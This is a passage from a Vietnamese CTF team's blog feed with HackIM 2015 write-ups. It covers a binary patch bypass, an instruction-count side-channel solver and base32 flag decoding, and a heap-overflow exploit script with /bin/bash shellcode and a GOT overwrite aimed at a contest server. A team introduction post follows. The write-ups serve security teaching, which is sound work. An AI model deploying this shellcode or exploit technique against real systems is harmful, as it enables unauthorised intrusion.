srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?w=477&amp;ssl=1 477w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=300%2C82&amp;ssl=1 300w" sizes="(max-width: 477px) 100vw, 477px" data-recalc-dims="1" /></a></p>
+<p>dừng ở đây, jump ngược từ good_boy và bad_boy ta thấy có đoạn sử dụng [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?ssl=1"><img data-attachment-id="277" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_4/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" data-orig-size="442,380" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_4" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" class="alignnone size-full wp-image-277" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=442%2C380&#038;ssl=1" alt="fin64_4" width="442" height="380" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?w=442&amp;ssl=1 442w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 442px) 100vw, 442px" data-recalc-dims="1" /></a></p>
+<p>nếu [rbp-10h] ở không bị thay đổi thì đoạn code pseudo ntn:</p>
+<pre class="lang:default decode:true ">[rbp-24h] = [dw_time+16]+1 = tháng
+[rbp-20h] = [dw_time+12] = ngày
+[rbp-1ch] = [dw_time+20] + 1900 = năm
+if ( [rbp-24h] == 9 &amp;&amp; [rbp-20h] == 10 &amp;&amp; [rbp-1ch] == 2011 )
+	good_boy
+else
+	bad_boy</pre>
+<p>thử đặt lại time là 10/9/2011 và run =&gt; still failed :wth:</p>
+<p>giờ ta jump back từ đoạn compare trên đến ngay sau chỗ convert, patch những đoạn jump để bypass khoảng ở giữa và chạy lại 1 lần nữa</p>
+<pre class="lang:default decode:true ">$ ./fin64
+Oops..</pre>
+<p>Good bj, mình đoán flag nằm trong memory, thử trace dần vào good_boy</p>
+<p>thì phát hiện ra cái này *byte_6c2070</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?ssl=1"><img data-attachment-id="278" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_5-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=789%2C214&amp;ssl=1" data-orig-size="789,214" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=300%2C81&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=604%2C164&amp;ssl=1" class="alignnone size-full wp-image-278" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=604%2C164&#038;ssl=1" alt="fin64_5" width="604" height="164" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?w=789&amp;ssl=1 789w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=300%2C81&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>next-challenge</p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 500 - cso</span></h2>
+<p>bài này thực sự không biết nên viết writeup như thế nào vì công nhận là nó khá bựa và cách làm cũng ngẫu hứng vãi nhái :3</p>
+<p>sau hồi dịch mình chả biết nó là cái giống gì, có vẻ giống virtual machine nhưng cũng ko giống lắm =)), đại khái nó như này:</p>
+<pre class="lang:python decode:true ">main:
+	print(Bla bla bla)
+	gets(st) #main input
+	len_st = strlen(st)
+	super = 0x24ae5af1 #first magic hex
+	while True:
+		A: 
+			if super-a1&gt;0: jump b1
+		B: 
+			if super-a2&gt;0: jump b2
+		C: 
+			if super-a3&gt;0: jump b3
+		...
+		V: 
+			if super-an&gt;0: jump bn
+		X:
+			super = a(n+1)
+		Y:
+			super = a(n+2)
+		...
+		Z:
+			super = am
+		quit:
+			break
+		dead: 
+			puts("You are dead man")
+			super = super_to_quit
+			continue
+		win: 
+			puts("You are safe and live forever")
+			super = super_to_quit
+			continue
+		check_len: 
+			if len_st==0x1A: 
+				super = super_to_stage2
+			else:
+				super = super_to_dead
+			continue
+		stage_2:
+			#func_stage2 ở địa chỉ 0x00400ec0
+			if func_stage2(st)==1: 
+				super = super_to_win
+			else:
+				super=super_to_dead
+			continue
+
+#mấy số a1, a2, ...an, a(n+1), ... , am là magic const, ko biết có quy luật gì những mà nó đc build để tính toán hợp lí
+#các jump b1, b2, b3, ... bn là nhãn của một trong mấy thằng A,B,C,...V, quit, dead, win, check_len, stage_2
+
+			
+def stage2(st):
+	#cấu trúc đệ quy
+	#vòng lặp tương tự main
+	#có thêm 1 số sub function phụ</pre>
+<p>Không biết flag ở chỗ nào luôn, code follow control dựa vào mấy phép cộng của a(i), giờ tìm quy luật cho nó cũng đuối đơ. Có duy nhất 1 cái chắc chắn là len_st = 0x1A = 26 (!!!)</p>
+<p>Sau nửa tiếng suy nghĩ, mình thấy khi input với len = 26 và len &lt; 26 thì cảm giác debug lâu hơn. Suy nghĩ: Side channel dựa vào instruction count được không?</p>
+<pre class="lang:sh decode:true ">$ python -c "print 'a'*26" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123368
+
+$ python -c "print 'a'*25" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097
+
+$ python -c "print 'a'*24" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097</pre>
+<p>Bingo, chuẩn girl mất rồi, side channel bem lần lượt các char</p>
+<pre class="lang:python decode:true">import subprocess
+import time
+
+sam = "abcdefghijklmnopqrstuvwxyz"
+sam += sam.upper()
+sam += "0123456789_!,.{}"
+
+#217826 SRRDRSSRSRRDDSSSRSSDSDDDSS
+
+def insco(fl):
+	fl += 'a'*(26-len(fl))
+	open('hellyeah','wt').write(fl)
+	subprocess.call("./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ../cso &lt; hellyeah", shell=True)
+	time.sleep(0.2)
+	k = open("inscount.out").read().strip().split(' ')[1]
+	print "-----", fl, k
+	return int(k)
+
+def dequy(fl):
+	if len(fl)==26:
+		print fl
+		raw_input("&lt;&lt; Another result, enter for the next...")
+	else:
+		a = insco(fl + 'a')
+		#Cho nay sample chi co 1 ki tu trong string "SRD" thoi (manual check), co the set sam = "SRD" side channel nhanh hon
+		for c in sam:
+			cou = insco(fl + c)
+			if cou-a&gt;400: dequy(fl + c)
+
+
+dequy('')</pre>
+<p>=&gt; Final <span style="color: #ff0000;">SRRDRSSRSRRDDSSSRSSDSDDDSS</span>. Không giống flag cho lắm :-ss</p>
+<p>Input test lại vẫn "You are dead man". Wut dafuq, đúng quá rồi còn gì.<br />
+Check lại cái inscount thì thấy có sự chênh lệch rất lớn ins.<br />
+Có thể là những mini-sub trong stage2 (0x00400ec0)<br />
+Kiểm tra lần lượt từng mini-sub đó ta thấy có sub_400BD0 sử dụng biến global(s) chính là string input ban đầu?!?</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?ssl=1"><img data-attachment-id="280" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_1/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" data-orig-size="532,82" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=300%2C46&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" class="alignnone size-full wp-image-280" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=532%2C82&#038;ssl=1" alt="cso_1" width="532" height="82" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?w=532&amp;ssl=1 532w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=300%2C46&amp;ssl=1 300w" sizes="(max-width: 532px) 100vw, 532px" data-recalc-dims="1" /></a></p>
+<p>Đặt breakpoint ngay tại đó và input đúng như trên, sau 1 số lần trace thì ...</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?ssl=1"><img data-attachment-id="281" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" data-orig-size="503,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=300%2C78&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" class="alignnone size-full wp-image-281" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=503%2C131&#038;ssl=1" alt="cso_2" width="503" height="131" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?w=503&amp;ssl=1 503w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=300%2C78&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a><br />
+Âu Mai Gót, call cái địa chỉ vừa trả về, không phải run shell thì là run cái gì nữa =))</p>
+<p>Chuyển hướng sang disass con shell, tương tự 3 bài rồi</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?ssl=1"><img data-attachment-id="279" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" data-orig-size="503,230" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=300%2C137&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" class="alignnone size-full wp-image-279" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=503%2C230&#038;ssl=1" alt="cso_3" width="503" height="230" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?w=503&amp;ssl=1 503w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=300%2C137&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a></p>
+<p>move rất nhiều ASCII Char vào memory, ghép lại thì thấy đó là 1 chuỗi base32 <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Hard time gone <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre class="lang:python decode:true">s = "MZWGCZ33NV4V6YZQNVYDINJVL4YTKX3VNYYXC5JTPU"
+sam = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+
+def tobin(t):
+    st = bin(t).replace('0b','')
+    st = '0'*(5-len(st)) + st
+    return st
+
+k = ''
+for i in s:
+    t = sam.find(i)
+    print i, sam.find(i), tobin(t)
+    k += tobin(t)
+
+k = k[0:208]
+print hex(int(k,2))[2:].replace('L','').decode('hex')</pre>
+<p><span style="color: #ff0000;"><strong>flag{my_c0mp455_15_un1qu3}</strong></span></p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">PWN 400 - Mental Note</span></h2>
+<p>bài này về cơ bản khá giống <a title="PWN500 - mixme" href="https://babyphd.net/2015/01/write-up-hackim-ctf-mixme-pwn5/" target="_blank">mixme</a></p>
+<p>cấu trúc dữ liệu:</p>
+<pre class="lang:c decode:true">struct note{
+	int size;
+	note* next_note;
+	note* prev_note;
+	content[linh động]
+}</pre>
+<p>và array_note[999] lưu địa chỉ con trỏ của mỗi note được thêm</p>
+<p>có 3 loại note:</p>
+<pre class="lang:default decode:true ">loại 0 : content 100 bytes
+loại 1 : content 200 bytes
+loại 2 : content 400 bytes</pre>
+<p>* add-note, người dùng nhập 1 loại note sau đó chương trình malloc 1 lượng bộ nhớ vừa đủ phần header+content size =&gt; new_note</p>
+<p>new_note được insert vào array_note sau khi đã check-note (dựa vào note header) để tìm id phù hợp.</p>
+<p>* edit-note, người dùng nhập id, loại note và read(note-id-content, size=note-type) mà ko check xem note ở id ấy có đúng loại không.<br />
+=&gt; nếu note add vào là loại 0 mà khi edit với loại 1/2 thì sẽ overwrite được sang header note khác.</p>
+<p>bằng cách này ta sẽ chỉnh phần header của note kế tiếp để khai thác lỗi check-note của add-note function.</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true ">import socket, time
+
+def send(s, m):
+    print "[SEND]", m
+    s.send(m)
+
+def recv(s):
+    t = s.recv(4096)
+    print "[RECV]", t
+    return t
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect (( "54.163.248.69",9004 ))
+
+recv(s)
+recv(s)
+
+#Add 3 notes, Type 0
+for i in range(3):
+	send(s, "1\n")
+	recv(s)
+	send(s, "0\n")
+	recv(s)
+
+#Edit note id=2, Type=0, shellcode
+send(s, "3\n")
+recv(s)
+send(s, "2\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+#shell
+shell = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+send(s, "\x90"*20 + shell)
+recv(s)
+
+#Edit note id=0, Type=1, overwrite header and change g0t.plt
+send(s, "3\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+send(s, "1\n")
+recv(s)
+#magic bytes
+send(s, (0x80-12)*'a' + "\x04\xc1\xeb\x0f\x1c\xb0\x04\x08")
+recv(s)
+
+#jump to shellcode by function was changed in g0t.plt
+send(s, "1\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+
+send(s,"cat flag.txt\n")
+recv(s)
+
+#flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
+
+s.close()</pre>
+<p><span style="color: #ff0000;"><strong>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</strong></span> !!!</p>
+<p><em>So long and deep, go get some sleep :'( . Chim!</em></p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">259</post-id>	</item>
+		<item>
+		<title>Welcome to BabyPhD!</title>
+		<link>https://babyphd.net/2015/01/01/welcome-to-babyphd/</link>
+				<pubDate>Thu, 01 Jan 2015 14:15:26 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=203</guid>
+				<description><![CDATA[Đôi lúc tôi hay một mình Tự hỏi rằng đời này có bao nhiêu ngày vui* &#160; Các trang blog CTF nói chung thường có hiện tượng bong bóng như kiểu nhà đất Việt Nam thập niên hai ngàn. Ất min ban đầu mới lập cũng chịu khó đầu tư. Dần dần cơm áo gạo tiền và đủ thứ &#8230; <a href="https://babyphd.net/2015/01/01/welcome-to-babyphd/" class="more-link">Continue reading <span class="screen-reader-text">Welcome to BabyPhD!</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p style="text-align: right;"><em>Đôi lúc tôi hay một mình</em></p>
+<p style="text-align: right;"><em>Tự hỏi rằng đời này có bao nhiêu ngày vui*</em></p>
+<p>&nbsp;</p>
+<p>Các trang blog CTF nói chung thường có hiện tượng bong bóng như kiểu nhà đất Việt Nam thập niên hai ngàn. Ất min ban đầu mới lập cũng chịu khó đầu tư. Dần dần cơm áo gạo tiền và đủ thứ vớ vẩn sinh chán. Thêm nữa hậu duệ kém không kế tục được sự nghiệp nên hỏng cả. Thời còn mông muội, dân tình vào chơi ngõ hầu muốn được cái gì đó nhưng dần dà blog CTF đã không đáp ứng được với thời cuộc. Ngay đến cả thằng đầu xỏ ất min cũng bỏ mẹ qua facebook cầm kiếm nhựa chém nhau. Ấy vậy mà BabyPhD chúng tôi vẫn mạnh dạn mở blog CTF writeup. Ở xã hội thấy thịnh thì phù mà thấy suy thì nhổ có được những thánh thần rơi rớt lại những tính túy cuối cùng của các tay <em>hacker</em> mũ trắng thật là tự thấy mừng cho cộng đồng IT Việt vậy.</p>
+<p>Để mở đầu cho chương trình nghệ thuật tấn công đến đâu viết lại tới đấy, chia sẻ chút kiến thức còm cõi cho đồng đạo security, chúng tôi xin hân hạnh khai trương blog BabyPhD với các thành viên trụ cột sau:</p>
+<ul>
+<li>chuymichxinhdep: đã xinh đẹp lại còn học thức &lt;3</li>
+<li>yeuchimse: lời ít tình chi thít</li>
+<li>peternguyen: anh hùng thời loạn</li>
+<li>justcallmedude: gay kín không tên</li>
+<li>antibkav: loại già có vợ nên luôn là thành viên bỏ đi của team, vớt vát cho nó phong phú</li>
+<li>huyna: hiệp sĩ thoắt ẩn thoắt hiện, chỉ thấy xi nhan khi có bài pwn</li>
+<li>chim: geohot của nhóm</li>
+</ul>
+<p>(Một vài thành viên khác xin giấu tên, số thành viên liên tục cập nhật nếu các bạn apply tại  <a href="https://www.facebook.com/babyphd.team">đây</a>)</p>
+<p>&nbsp;</p>
+<p>Xin chào thân ái và quyết thắng</p>
+<p>- Chụy Mích</p>
+<p>*Đời có bao nhiêu ngày vui - st:Châu Đăng Khoa</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">203</post-id>	</item>
+	</channel>
+</rss>
